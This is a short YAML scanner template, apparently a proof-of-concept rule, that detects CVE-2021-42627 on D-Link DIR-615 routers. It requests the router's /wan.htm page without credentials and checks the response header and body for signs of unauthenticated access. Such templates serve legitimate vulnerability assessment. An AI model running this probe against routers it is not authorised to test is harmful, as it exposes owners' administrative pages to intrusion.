name: poc-yaml-dlink-cve-2021-42627-unauth
binding: 4b8827d5-d683-44c1-9b81-cdbb95e097f4
manual: true
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://github.com/sanjokkarki/D-Link-DIR-615/blob/main/CVE-2021-42627
    vulnerability:
        id: CT-474434
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wan.htm
            follow_redirects: false
        expression: response.status == 200 && response.headers["Server"].contains("Virtual Web") && response.body.bcontains(b"document.write(\"<s\"+\"cript type='text/javascript' src='menu.js?v=\"+Math.random()+\"'></scr\"+\"ipt>\");")
expression: r0()
